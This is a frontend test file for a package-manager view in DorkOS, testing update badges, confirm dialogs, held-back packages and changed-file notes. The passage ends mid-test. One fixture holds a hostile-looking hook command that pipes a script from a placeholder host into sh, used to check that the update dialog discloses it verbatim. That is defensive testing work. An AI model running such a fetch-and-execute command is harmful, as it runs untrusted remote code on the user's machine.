/**
 * @vitest-environment jsdom
 */
import { describe, it, expect, vi, beforeEach, afterEach, beforeAll } from 'vitest';
import { render, screen, cleanup, act, fireEvent, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import type {
  InstallationUpdateCheck,
  InstallIntegrity,
  InstalledPackage,
  InstalledShapeSummary,
} from '@dorkos/shared/marketplace-schemas';
import {
  useApplyingInstallPaths,
  useInstalledIntegrity,
  useInstalledPackages,
} from '@/layers/entities/marketplace';
import { useShapes } from '@/layers/entities/shapes';
import { useAppStore } from '@/layers/shared/model';

import { useUninstallWithToast } from '../model/use-uninstall-with-toast';
import { useApplyUpdatesWithToast } from '../model/use-apply-updates-with-toast';
import { useCheckFilesWithToast } from '../model/use-check-files-with-toast';
import {
  useInstalledUpdatesView,
  type InstalledUpdatesView,
} from '../model/use-installed-updates-view';
import { indexChecks, summarizeUpdates } from '../lib/installed-updates';
import { InstalledPackagesView } from '../ui/InstalledPackagesView';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------
// The view drives uninstall/update through the feature-layer toast wrappers
// (which fire sonner notifications) and reads the update check through the
// feature's view hook, so mock those rather than the raw entity hooks.

const reviewMutate = vi.fn();
/** What the held-back listing answers, for the keep-files confirm step (DOR-2341). */
let heldBackQuery: { data?: unknown[]; isPending: boolean } = { data: [], isPending: false };
vi.mock('@/layers/entities/marketplace', () => ({
  useInstalledPackages: vi.fn(),
  useApplyingInstallPaths: vi.fn(),
  useReviewHeldBackPackage: () => ({
    mutate: reviewMutate,
    isPending: false,
    variables: undefined,
  }),
  useInstalledIntegrity: vi.fn(),
  useHeldBackPackages: () => heldBackQuery,
  useMarketplacePackages: () => ({ data: [] }),
  // Dev links (DOR-2696): inert unless a test sets them.
  useDevLinks: () => ({ data: { links: [] } }),
  useUnlinkDevLink: () => ({ mutateAsync: vi.fn(), isPending: false }),
  usePreviewDevLink: () => ({ mutateAsync: vi.fn(), isPending: false, reset: vi.fn() }),
  useLinkFolder: () => ({ mutateAsync: vi.fn(), isPending: false, reset: vi.fn() }),
  useDevLinkReloadStore: (select: (s: { latest: Record<string, unknown> }) => unknown) =>
    select({ latest: {} }),
  devLinkKey: () => 'key',
}));

vi.mock('../model/use-check-files-with-toast', () => ({
  useCheckFilesWithToast: vi.fn(),
}));

const keepMutate = vi.fn();
vi.mock('../model/use-keep-files-with-toast', () => ({
  useKeepFilesWithToast: () => ({ mutate: keepMutate, isPending: false }),
}));

vi.mock('@/layers/entities/mesh', () => ({
  useMeshAgentPaths: () => ({ data: { agents: [] } }),
}));

vi.mock('@/layers/entities/shapes', () => ({
  useShapes: vi.fn(),
}));

vi.mock('../model/use-uninstall-with-toast', () => ({
  useUninstallWithToast: vi.fn(),
}));

vi.mock('../model/use-apply-updates-with-toast', () => ({
  useApplyUpdatesWithToast: vi.fn(),
}));

vi.mock('../model/use-installed-updates-view', () => ({
  useInstalledUpdatesView: vi.fn(),
}));

const uninstallMutate = vi.fn();
const checkFilesMutate = vi.fn();

/** Set what verification says about each installation, by installPath (DOR-2197). */
function setIntegrity(byPath: Record<string, InstallIntegrity> = {}) {
  vi.mocked(useInstalledIntegrity).mockReturnValue({
    data: new Map(Object.entries(byPath)),
  } as unknown as ReturnType<typeof useInstalledIntegrity>);
}

function setCheckFilesState(state: { isPending?: boolean; variables?: { name: string } } = {}) {
  vi.mocked(useCheckFilesWithToast).mockReturnValue({
    mutate: checkFilesMutate,
    isPending: state.isPending ?? false,
    variables: state.variables,
  } as unknown as ReturnType<typeof useCheckFilesWithToast>);
}
const applyUpdates = vi.fn();
const recheck = vi.fn();

interface MutationMockState {
  isPending?: boolean;
  variables?: { name: string };
}

function setInstalledState(state: {
  data?: InstalledPackage[];
  isLoading?: boolean;
  error?: Error | null;
}) {
  vi.mocked(useInstalledPackages).mockReturnValue({
    data: state.data,
    isLoading: state.isLoading ?? false,
    error: state.error ?? null,
    refetch: vi.fn(),
  } as unknown as ReturnType<typeof useInstalledPackages>);
}

function setShapesState(data: InstalledShapeSummary[] = []) {
  vi.mocked(useShapes).mockReturnValue({
    data,
    isLoading: false,
    isError: false,
  } as unknown as ReturnType<typeof useShapes>);
}

function setUninstallState(state: MutationMockState = {}) {
  vi.mocked(useUninstallWithToast).mockReturnValue({
    mutate: uninstallMutate,
    mutateAsync: vi.fn(),
    isPending: state.isPending ?? false,
    isSuccess: false,
    isError: false,
    error: null,
    variables: state.variables,
    reset: vi.fn(),
  } as unknown as ReturnType<typeof useUninstallWithToast>);
}

/**
 * Set the update check the view reads. The summary is computed with the real
 * join from the rows given, exactly as the hook computes it.
 */
function setUpdatesState(
  state: {
    rows?: InstalledPackage[];
    checks?: InstallationUpdateCheck[];
    isChecking?: boolean;
    error?: Error | null;
    applying?: string[];
  } = {}
) {
  const checks = indexChecks(state.checks);
  vi.mocked(useInstalledUpdatesView).mockReturnValue({
    checks,
    summary: summarizeUpdates(state.rows ?? [], checks),
    isChecking: state.isChecking ?? false,
    error: state.error ?? null,
    recheck,
  } satisfies InstalledUpdatesView);
  vi.mocked(useApplyingInstallPaths).mockReturnValue(new Set(state.applying ?? []));
}

// ---------------------------------------------------------------------------
// Polyfills (pointer capture for Radix ripples, matchMedia for responsive)
// ---------------------------------------------------------------------------

beforeAll(() => {
  Object.defineProperty(window, 'matchMedia', {
    writable: true,
    value: vi.fn().mockImplementation((query: string) => ({
      matches: false,
      media: query,
      onchange: null,
      addListener: vi.fn(),
      removeListener: vi.fn(),
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
      dispatchEvent: vi.fn(),
    })),
  });
});

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

function makeInstalled(overrides: Partial<InstalledPackage> = {}): InstalledPackage {
  return {
    name: '@dorkos/reviewer',
    version: '1.2.0',
    type: 'agent',
    installPath: '/tmp/.dork/agents/reviewer',
    installedFrom: 'github.com/dorkos/reviewer',
    installedAt: '2026-03-15T12:00:00.000Z',
    ...overrides,
  };
}

/** A check for a row, current by default. */
function makeCheck(
  pkg: InstalledPackage,
  overrides: Partial<InstallationUpdateCheck> = {}
): InstallationUpdateCheck {
  return {
    packageName: pkg.name,
    installedVersion: pkg.version,
    latestVersion: pkg.version,
    hasUpdate: false,
    marketplace: 'dorkos-community',
    status: 'current',
    extensions: [],
    installPath: pkg.installPath,
    type: pkg.type,
    scope: pkg.scope ?? 'global',
    agentPath: pkg.agentPath,
    agentName: pkg.agentName,
    ...overrides,
  };
}

/** A check that found a newer version for a row. */
function staleCheck(pkg: InstalledPackage, latestVersion: string): InstallationUpdateCheck {
  return makeCheck(pkg, { latestVersion, hasUpdate: true, status: 'update-available' });
}

/** Show these rows with these checks. */
function showRows(rows: InstalledPackage[], checks: InstallationUpdateCheck[] = [], extra = {}) {
  setInstalledState({ data: rows });
  setUpdatesState({ rows, checks, ...extra });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('InstalledPackagesView', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    setUninstallState();
    setUpdatesState();
    vi.mocked(useApplyUpdatesWithToast).mockReturnValue({ apply: applyUpdates });
    setShapesState();
    setIntegrity();
    setCheckFilesState();
    useAppStore.setState({ shapeSwitcherOpen: false, shapeSwitcherFocus: null });
  });

  afterEach(cleanup);

  describe('state rendering', () => {
    it('renders the error state when the query errors', () => {
      setInstalledState({ error: new Error('Disk full') });

      render(<InstalledPackagesView />);

      expect(screen.getByText(/disk full/i)).toBeInTheDocument();
      expect(screen.getByRole('button', { name: /try again/i })).toBeInTheDocument();
    });

    it('keeps a dependency warning visible on the package it belongs to (DOR-1341)', () => {
      // The install toast said this once and is long gone. A package that is on
      // disk but missing its libraries has to be able to say so on the surface
      // a person visits when something is not working.
      setInstalledState({
        data: [
          makeInstalled({
            dependencyWarnings: [
              "DorkOS could not install this package's npm libraries because npm is not installed. Run `npm install --omit=dev` in /tmp/p to finish setting it up.",
            ],
          }),
        ],
      });

      render(<InstalledPackagesView />);

      expect(
        screen.getByText(/could not install this package's npm libraries/i)
      ).toBeInTheDocument();
      // The remedy travels with it — a warning you cannot act on is noise.
      expect(screen.getByText(/npm install --omit=dev/)).toBeInTheDocument();
    });

    it('renders a row per installed package', () => {
      setInstalledState({
        data: [
          makeInstalled({ name: '@dorkos/reviewer', version: '1.2.0' }),
          makeInstalled({ name: '@dorkos/formatter', type: 'plugin', version: '2.0.1' }),
        ],
      });

      render(<InstalledPackagesView />);

      const list = screen.getByRole('list', { name: /installed packages/i });
      expect(list).toBeInTheDocument();
      expect(screen.getByText('Reviewer')).toBeInTheDocument();
      expect(screen.getByText('Formatter')).toBeInTheDocument();
      expect(screen.getByText('v1.2.0')).toBeInTheDocument();
      expect(screen.getByText('v2.0.1')).toBeInTheDocument();
    });

    it('renders an installed Shape with its SHAPE type badge (DOR-355 regression)', () => {
      // Shapes install to <dorkHome>/shapes/<name> and were invisible here until
      // the scanner learned to walk that root; once listed, the row must render
      // with the SHAPE badge like any other type.
      setInstalledState({
        data: [
          makeInstalled({
            name: 'linear-ops',
            type: 'shape',
            version: '2.0.0',
            scope: 'global',
            installPath: '/tmp/.dork/shapes/linear-ops',
          }),
        ],
      });

      render(<InstalledPackagesView />);

      expect(screen.getByText('Linear Ops')).toBeInTheDocument();
      expect(screen.getByText('SHAPE')).toBeInTheDocument();
      expect(screen.getByText('v2.0.0')).toBeInTheDocument();
    });

    it('shows the same cyan CONNECTOR badge Browse shows, for an installed connector adapter (DOR-710)', () => {
      // Browse already renders CONNECTOR for adapterType: 'connector'; the
      // installed view used to render the generic ADAPTER badge instead
      // because the installed-package DTO carried no adapterType.
      setInstalledState({
        data: [
          makeInstalled({
            name: 'slack-connector',
            type: 'adapter',
            adapterType: 'connector',
            version: '1.0.0',
            installPath: '/tmp/.dork/plugins/slack-connector',
          }),
        ],
      });

      render(<InstalledPackagesView />);

      expect(screen.getByText('CONNECTOR')).toBeInTheDocument();
      expect(screen.queryByText('ADAPTER')).not.toBeInTheDocument();
    });
  });

  describe('shape rows: apply + active', () => {
    const SHAPE_ROW: Partial<InstalledPackage> = {
      name: 'linear-ops',
      type: 'shape',
      version: '2.0.0',
      scope: 'global',
      installPath: '/tmp/.dork/shapes/linear-ops',
    };

    it('offers Apply on a shape row and opens the switcher landed on THAT shape', async () => {
      const user = userEvent.setup();
      setInstalledState({ data: [makeInstalled(SHAPE_ROW)] });

      render(<InstalledPackagesView />);

      const applyBtn = screen.getByRole('button', { name: /apply Linear Ops/i });
      expect(useAppStore.getState().shapeSwitcherOpen).toBe(false);
      await user.click(applyBtn);
      expect(useAppStore.getState().shapeSwitcherOpen).toBe(true);
      // The affordance is honest AND direct — it passes the row's raw name so the
      // switcher highlights the exact Shape, not a generic list.
      expect(useAppStore.getState().shapeSwitcherFocus).toBe('linear-ops');
    });

    it('marks the applied shape with an Active badge and hides its Apply action', () => {
      setInstalledState({
        data: [
          makeInstalled(SHAPE_ROW),
          makeInstalled({
            ...SHAPE_ROW,
            name: 'flow-board',
            installPath: '/tmp/.dork/shapes/flow-board',
          }),
        ],
      });
      setShapesState([
        { name: 'linear-ops', displayName: 'Linear Ops', active: true },
        { name: 'flow-board', displayName: 'Flow Board', active: false },
      ]);

      render(<InstalledPackagesView />);

      // The active shape's row carries the badge and NO Apply — the badge is the
      // state, and re-apply lives in the switcher (no redundant button).
      const activeRow = screen.getByText('Linear Ops').closest<HTMLElement>('[role="listitem"]')!;
      expect(within(activeRow).getByText('Active')).toBeInTheDocument();
      expect(
        within(activeRow).queryByRole('button', { name: /apply Linear Ops/i })
      ).not.toBeInTheDocument();
      // The non-active shape offers Apply and shows no badge.
      const otherRow = screen.getByText('Flow Board').closest<HTMLElement>('[role="listitem"]')!;
      expect(within(otherRow).queryByText('Active')).not.toBeInTheDocument();
      expect(
        within(otherRow).getByRole('button', { name: /apply Flow Board/i })
      ).toBeInTheDocument();
    });
  });

  describe('update states', () => {
    const REVIEWER = makeInstalled({ name: '@dorkos/reviewer', version: '1.2.0' });
    const FORMATTER = makeInstalled({
      name: '@dorkos/formatter',
      type: 'plugin',
      version: '2.0.1',
      installPath: '/tmp/.dork/plugins/formatter',
    });
    const REVIEWER_ON_ALPHA = makeInstalled({
      name: '@dorkos/reviewer',
      version: '1.1.0',
      scope: 'agent-local',
      agentPath: '/work/alpha',
      agentName: 'Alpha',
      installPath: '/work/alpha/.dork/agents/reviewer',
    });

    function row(name: string, index = 0): HTMLElement {
      return screen.getAllByText(name)[index]!.closest<HTMLElement>('[role="listitem"]')!;
    }

    it('shows a stale row as stale, with both versions, before anything is clicked', () => {
      // Purpose: the issue's first acceptance line. The person can see what is
      // out of date, and by how much, without pressing a button to find out.
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')]);

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(within(reviewer).getByText(/update available: v1\.2\.0/i)).toHaveTextContent(
        /v1\.2\.0\s*→\s*to\s*v1\.3\.0/
      );
      expect(
        within(reviewer).getByRole('button', { name: 'Update Reviewer from v1.2.0 to v1.3.0' })
      ).toHaveTextContent('Update to v1.3.0');
    });

    it('says why a row could not be checked, and offers no Update there', () => {
      // Purpose: DorkOS never calls a package current when it couldn’t check it,
      // and a blind Update is exactly what this row must not get.
      showRows(
        [REVIEWER],
        [
          makeCheck(REVIEWER, {
            status: 'unknown',
            latestVersion: '',
            note: 'linked install — update its source instead',
          }),
        ]
      );

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(
        within(reviewer).getByText(
          'Couldn’t check for updates: linked install — update its source instead'
        )
      ).toBeInTheDocument();
      expect(within(reviewer).queryByText('Up to date')).not.toBeInTheDocument();
      expect(within(reviewer).queryByRole('button', { name: /update/i })).not.toBeInTheDocument();
    });

    it('updates exactly the row that was clicked', async () => {
      // Purpose: a row's Update reinstalls that installation (by its path), not
      // every installation that shares its name.
      const user = userEvent.setup();
      const aliceCheck = staleCheck(REVIEWER_ON_ALPHA, '1.3.0');
      showRows([REVIEWER, REVIEWER_ON_ALPHA], [staleCheck(REVIEWER, '1.3.0'), aliceCheck]);

      render(<InstalledPackagesView />);
      await user.click(
        screen.getByRole('button', { name: 'Update Reviewer on Alpha from v1.1.0 to v1.3.0' })
      );

      expect(applyUpdates).toHaveBeenCalledTimes(1);
      expect(applyUpdates).toHaveBeenCalledWith([
        { installation: REVIEWER_ON_ALPHA, check: aliceCheck },
      ]);
    });

    it('confirms first, listing what it runs, when the new version runs something (DOR-2306)', async () => {
      // Purpose: a row's Update used to reinstall at once with nothing shown.
      // A new version that runs anything on its own now opens the confirm,
      // and nothing is reinstalled until the person confirms.
      const user = userEvent.setup();
      const hooked = {
        ...staleCheck(REVIEWER, '1.3.0'),
        disclosed: {
          hooks: [
            {
              event: 'PreToolUse',
              matcher: null,
              command: 'curl -s https://x.example | sh',
              source: null,
            },
          ],
          schedules: [],
          mcpServers: [
            { name: 'spy', transport: 'stdio', command: 'node', args: ['spy.js'], url: null },
          ],
          lspServers: [],
          monitors: [],
          executables: [],
          skillTools: [],
          skillCommands: [],
        },
      };
      showRows([REVIEWER], [hooked]);

      render(<InstalledPackagesView />);
      await user.click(
        screen.getByRole('button', { name: 'Update Reviewer from v1.2.0 to v1.3.0' })
      );

      expect(applyUpdates).not.toHaveBeenCalled();
      const dialog = await screen.findByRole('dialog', { name: 'Update Reviewer?' });
      const runs = within(dialog).getByRole('list', { name: 'What the new version runs' });
      // Verbatim, never paraphrased: the command is what a person judges.
      expect(runs).toHaveTextContent('curl -s https://x.example | sh');
      expect(runs).toHaveTextContent('"node" "spy.js"');
      // A global install's own programs start in every session, and it says so.
      expect(runs).toHaveTextContent('Starts in every chat.');

      await user.click(within(dialog).getByRole('button', { name: 'Update Reviewer' }));
      expect(applyUpdates).toHaveBeenCalledWith([{ installation: REVIEWER, check: hooked }]);
    });

    it('does nothing when an installation being updated is pressed again', async () => {
      // Purpose: the button stays focusable while updating, so pressing it
      // must not start a second update.
      const user = userEvent.setup();
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')], { applying: [REVIEWER.installPath] });

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Updating Reviewer' }));

      expect(applyUpdates).not.toHaveBeenCalled();
    });

    it('moves focus to the row’s status line when its Update button leaves', async () => {
      // Purpose: once the package is current its Update button is gone; a
      // keyboard user who pressed it must land on "Up to date", not the page.
      const user = userEvent.setup();
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')]);
      const { rerender } = render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: /^update reviewer/i }));
      expect(screen.getByRole('button', { name: /^update reviewer/i })).toHaveFocus();

      showRows([REVIEWER], [makeCheck(REVIEWER)]);
      rerender(<InstalledPackagesView />);

      const status = within(row('Reviewer')).getByTestId('installation-update-status');
      expect(status).toHaveFocus();
      expect(status).toHaveTextContent('Up to date');
    });

    it('keeps a failed update on its row, with the reason, and still offers it', () => {
      // Purpose: a failure stays visible where it happened, and can be retried.
      showRows([REVIEWER], [{ ...staleCheck(REVIEWER, '1.3.0'), applyError: 'disk full' }]);

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(within(reviewer).getByText('Couldn’t update: disk full')).toBeInTheDocument();
      // Bare red text on the card wears the text-tuned red, not the tint's
      // `-fg` partner, which misses AA on grey in dark mode (DOR-2493).
      expect(within(reviewer).getByText('Couldn’t update: disk full').closest('p')).toHaveClass(
        'text-destructive'
      );
      expect(within(reviewer).getByRole('button', { name: /^update reviewer/i })).toBeEnabled();
    });

    it('counts what needs updating, what is current, and what could not be checked', () => {
      showRows(
        [REVIEWER, FORMATTER, REVIEWER_ON_ALPHA],
        [
          staleCheck(REVIEWER, '1.3.0'),
          makeCheck(FORMATTER),
          makeCheck(REVIEWER_ON_ALPHA, { status: 'unknown', latestVersion: '' }),
        ]
      );

      render(<InstalledPackagesView />);

      expect(screen.getByRole('status')).toHaveTextContent(
        '1 update available.1 package is up to date.1 package couldn’t be checked.'
      );
    });

    it('shows a failed check with its reason and a way to try again', async () => {
      // Purpose: when the whole check fails there are no answers, so no row may
      // claim one, and the person can ask again.
      const user = userEvent.setup();
      showRows([REVIEWER], [], { error: new Error('Failed to fetch') });

      render(<InstalledPackagesView />);

      expect(screen.getByRole('status')).toHaveTextContent(
        'Couldn’t check for updates: Failed to fetch'
      );
      expect(within(row('Reviewer')).queryByText('Up to date')).not.toBeInTheDocument();
      await user.click(screen.getByRole('button', { name: 'Try again' }));
      expect(recheck).toHaveBeenCalledTimes(1);
    });
  });

  describe('held-back global packages (DOR-2306, I2)', () => {
    /** The row that lists `name`. */
    function row(name: string): HTMLElement {
      return screen.getAllByText(name)[0]!.closest<HTMLElement>('[role="listitem"]')!;
    }

    it('says a held-back package is held back and why, and asks again on Review', async () => {
      // Purpose: a package left out of every session must never just vanish.
      const user = userEvent.setup();
      const held = makeInstalled({
        name: 'fmt',
        type: 'plugin',
        heldBack: {
          reason: 'unasked',
          reviewable: true,
          note: 'Held back: its files changed since you approved it. Review it to decide.',
        },
      });
      showRows([held]);

      render(<InstalledPackagesView />);

      const fmt = row('Fmt');
      expect(within(fmt).getByText('Held back')).toBeInTheDocument();
      expect(within(fmt).getByText(/its files changed since you approved it/)).toBeInTheDocument();
      await user.click(within(fmt).getByRole('button', { name: 'Review Fmt' }));
      expect(reviewMutate).toHaveBeenCalledWith('fmt', expect.anything());
    });

    it('offers no Review for one that cannot be put on a card, and says what to do', () => {
      const held = makeInstalled({
        name: 'broken',
        type: 'plugin',
        heldBack: {
          reason: 'unreadable',
          reviewable: false,
          note: 'Held back: DorkOS could not read part of it (hooks/hooks.json). Reinstall it, or uninstall it.',
        },
      });
      showRows([held]);

      render(<InstalledPackagesView />);

      expect(
        within(row('Broken')).queryByRole('button', { name: /review/i })
      ).not.toBeInTheDocument();
      expect(within(row('Broken')).getByText(/Reinstall it, or uninstall it/)).toBeInTheDocument();
    });
  });

  describe('update all', () => {
    const REVIEWER = makeInstalled({ name: '@dorkos/reviewer', version: '1.2.0' });
    const FORMATTER = makeInstalled({
      name: '@dorkos/formatter',
      type: 'plugin',
      version: '2.0.1',
      installPath: '/tmp/.dork/plugins/formatter',
    });
    const FLOW_ON_ALPHA = makeInstalled({
      name: 'flow',
      type: 'plugin',
      version: '0.7.2',
      scope: 'agent-local',
      agentPath: '/work/alpha',
      agentName: 'Alpha',
      installPath: '/work/alpha/.dork/plugins/flow',
    });
    const CHECKS = [
      staleCheck(REVIEWER, '1.3.0'),
      makeCheck(FORMATTER),
      staleCheck(FLOW_ON_ALPHA, '0.7.3'),
    ];

    it('names exactly the installations it will touch, by place and version', async () => {
      // Purpose: the confirm step lists every stale installation (and only
      // those), each with where it lives and what it changes to.
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS);

      render(<InstalledPackagesView />);
      expect(screen.getByRole('status')).toHaveTextContent('2 updates available.');
      await user.click(screen.getByRole('button', { name: 'Update all…' }));

      const dialog = await screen.findByRole('dialog', { name: 'Update 2 packages?' });
      const items = within(
        within(dialog).getByRole('list', { name: 'Packages to update' })
      ).getAllByRole('listitem');
      expect(items).toHaveLength(2);
      expect(items[0]).toHaveTextContent('Reviewer');
      expect(items[0]).toHaveTextContent('All agents');
      expect(items[0]).toHaveTextContent(/v1\.2\.0\s*→\s*to\s*v1\.3\.0/);
      expect(items[1]).toHaveTextContent('Flow');
      expect(items[1]).toHaveTextContent('Alpha');
      expect(items[1]).toHaveTextContent('/work/alpha');
      expect(items[1]).toHaveTextContent(/v0\.7\.2\s*→\s*to\s*v0\.7\.3/);
      expect(within(dialog).queryByText('Formatter')).not.toBeInTheDocument();
    });

    it('applies exactly what it showed when confirmed', async () => {
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));
      const dialog = await screen.findByRole('dialog');
      await user.click(within(dialog).getByRole('button', { name: 'Update 2 packages' }));

      expect(applyUpdates).toHaveBeenCalledTimes(1);
      expect(applyUpdates).toHaveBeenCalledWith([
        { installation: REVIEWER, check: CHECKS[0] },
        { installation: FLOW_ON_ALPHA, check: CHECKS[2] },
      ]);
      expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    });

    it('updates nothing when cancelled', async () => {
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));
      const dialog = await screen.findByRole('dialog');
      await user.click(within(dialog).getByRole('button', { name: 'Cancel' }));

      expect(applyUpdates).not.toHaveBeenCalled();
      expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    });

    it('says when a new version runs nothing, and that a project copy does not start programs', async () => {
      // Purpose: "runs nothing" must be said, never left as a blank a person
      // cannot tell from "not checked"; and a project install's servers do not
      // start, which the row must not overstate.
      const user = userEvent.setup();
      const quiet = staleCheck(REVIEWER, '1.3.0');
      quiet.extensions = [];
      quiet.disclosed = {
        hooks: [],
        schedules: [],
        mcpServers: [],
        lspServers: [],
        monitors: [],
        executables: [],
        skillTools: [],
        skillCommands: [],
      };
      const withServer = {
        ...staleCheck(FLOW_ON_ALPHA, '0.7.3'),
        disclosed: {
          hooks: [],
          schedules: [],
          mcpServers: [{ name: 'db', transport: 'stdio', command: 'db-mcp', args: [], url: null }],
          lspServers: [],
          monitors: [],
          executables: [],
          skillTools: [],
          skillCommands: [],
        },
      };
      showRows([REVIEWER, FLOW_ON_ALPHA], [quiet, withServer]);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));

      const dialog = await screen.findByRole('dialog');
      const items = within(
        within(dialog).getByRole('list', { name: 'Packages to update' })
      ).getAllByRole('listitem', { name: undefined });
      expect(items[0]).toHaveTextContent('The new version runs nothing on its own.');
      expect(
        within(dialog).getByRole('list', { name: 'What the new version runs' })
      ).toHaveTextContent('Declared, but not started for a project install.');
    });
  });

  describe('whether files changed since install (DOR-2197, DOR-2320)', () => {
    const FLOW = makeInstalled({
      name: 'flow',
      type: 'plugin',
      version: '0.7.2',
      installPath: '/tmp/.dork/plugins/flow',
    });
    const MODIFIED: InstallIntegrity = {
      status: 'modified',
      changed: ['skills/a/SKILL.md', 'hooks/hooks.json'],
      missing: ['README.md'],
      added: ['skills/mine/SKILL.md'],
      customized: [],
    };
    const legacy = (check?: InstallIntegrity extends infer T ? unknown : never) =>
      ({ status: 'unknown', reason: 'no-record', ...(check ? { check } : {}) }) as InstallIntegrity;

    // Purpose (review 3): the note counts each kind of change in its own words,
    // and says what an update does to each: edited files are replaced (the
    // person's copies kept), added files stay, removed files come back.
    it('counts each kind of change and says what an update does to it', () => {
      showRows([FLOW], [staleCheck(FLOW, '0.7.3')]);
      setIntegrity({ [FLOW.installPath]: MODIFIED });

      render(<InstalledPackagesView />);

      const note = screen.getByTestId('installation-integrity');
      expect(note).toHaveTextContent(
        '4 files changed since install (2 edited, 1 added, 1 removed).Updating replaces your edits; copies are kept.Updating replaces the 2 files you edited and keeps your copies beside them.The file you added stays.The file you removed comes back.'
      );
      expect(note).not.toHaveTextContent('.dork-old');
    });

    // Purpose (review 4): the note is a native disclosure (a <summary>, so a
    // keyboard, a click or a tap opens it; the real-browser keyboard pass is in
    // the implementation log), listing the paths grouped Edited/Added/Removed.
    it('opens to the paths, grouped by kind', async () => {
      const user = userEvent.setup();
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({ [FLOW.installPath]: MODIFIED });
      render(<InstalledPackagesView />);
      const note = screen.getByTestId('installation-integrity');
      expect(note).not.toHaveAttribute('open');

      const summary = note.querySelector('summary')!;
      expect(summary.tabIndex).toBe(0);
      await user.click(summary);

      expect(note).toHaveAttribute('open');
      expect(within(note).getByRole('list', { name: 'Edited' })).toHaveTextContent(
        'skills/a/SKILL.mdhooks/hooks.json'
      );
      expect(within(note).getByRole('list', { name: 'Added' })).toHaveTextContent(
        'skills/mine/SKILL.md'
      );
      expect(within(note).getByRole('list', { name: 'Removed' })).toHaveTextContent('README.md');
    });

    // Purpose (review 5, 6): an older install with a version to compare with
    // says what Check files does, and the button checks exactly that installation.
    it('offers Check files for an older install, with what it does', async () => {
      const user = userEvent.setup();
      const onAlpha = makeInstalled({
        ...FLOW,
        scope: 'agent-local',
        agentPath: '/work/alpha',
        agentName: 'Alpha',
        installPath: '/work/alpha/.dork/plugins/flow',
      });
      showRows([onAlpha], [makeCheck(onAlpha)]);
      setIntegrity({ [onAlpha.installPath]: legacy({ source: 'fetchable' }) });

      render(<InstalledPackagesView />);

      expect(screen.getByTestId('installation-integrity')).toHaveTextContent(
        'Installed by an older DorkOS. Check files so updates keep your edits.'
      );
      await user.click(screen.getByRole('button', { name: 'Check the files of Flow on Alpha' }));
      expect(checkFilesMutate).toHaveBeenCalledWith({
        name: 'flow',
        options: { installRoot: onAlpha.installPath, projectPath: '/work/alpha' },
        where: 'Alpha',
      });
    });

    // Purpose (review 2, item 6): after the files were found to differ, the
    // note gives the reason and a small Try again, not the full button: the
    // person may have put their edits back and want to check again.
    it('gives the reason and a Try again after the files were found to differ', async () => {
      const user = userEvent.setup();
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({
        [FLOW.installPath]: legacy({
          source: 'fetchable',
          last: { outcome: 'mismatch', message: 'Some files differ.' },
        } as never),
      });
      render(<InstalledPackagesView />);

      const note = screen.getByTestId('installation-integrity');
      expect(note).toHaveTextContent('Some files differ.');
      expect(
        screen.queryByRole('button', { name: 'Check the files of Flow' })
      ).not.toBeInTheDocument();
      await user.click(within(note).getByRole('button', { name: 'Check the files of Flow again' }));
      expect(checkFilesMutate).toHaveBeenCalledWith(
        expect.objectContaining({ name: 'flow', options: { installRoot: FLOW.installPath } })
      );
    });

    // Purpose (DOR-2322): files an update kept because nothing proved whose
    // they were stay on the row: a note that counts them, opens to the paths,
    // says what happened, and offers Check files to sort them. Fails if they
    // go unmentioned or Check files is not offered.
    it('names the files an update kept unproven, and offers Check files to sort them', async () => {
      const user = userEvent.setup();
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({
        [FLOW.installPath]: {
          status: 'clean',
          customized: [],
          unproven: {
            files: ['notes.txt', 'old.md'],
            running: [],
            check: { source: 'fetchable' },
            keepKey: 'sha256:kept',
          },
        },
      });
      render(<InstalledPackagesView />);

      const note = screen.getByTestId('installation-integrity-unproven');
      expect(note).toHaveTextContent('Kept 2 files an update couldn’t sort.');
      await user.click(note.querySelector('summary')!);
      expect(within(note).getByRole('list', { name: 'Kept' })).toHaveTextContent('notes.txt');
      expect(note).toHaveTextContent(
        'Unclear if these are yours or leftovers, so DorkOS kept them.Check files sets aside the leftovers and keeps yours.'
      );
      expect(screen.getByRole('button', { name: 'Check the files of Flow' })).toBeEnabled();
    });

    // Purpose (review 3): a kept file where a package keeps what it runs still
    // runs, so the note says how many in its closed line, lists them apart,
    // and carries the amber weight a quiet note does not. Fails if running
    // kept files read like inert ones.
    it('says which kept files still run, in the stronger weight', async () => {
      const user = userEvent.setup();
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({
        [FLOW.installPath]: {
          status: 'clean',
          customized: [],
          unproven: {
            files: ['commands/old.md', 'notes.txt', 'skills/old/SKILL.md'],
            running: ['commands/old.md', 'skills/old/SKILL.md'],
            check: { source: 'fetchable' },
            keepKey: 'sha256:kept',
          },
        },
      });
      render(<InstalledPackagesView />);

      const note = screen.getByTestId('installation-integrity-unproven');
      expect(note).toHaveAttribute('data-runs', 'true');
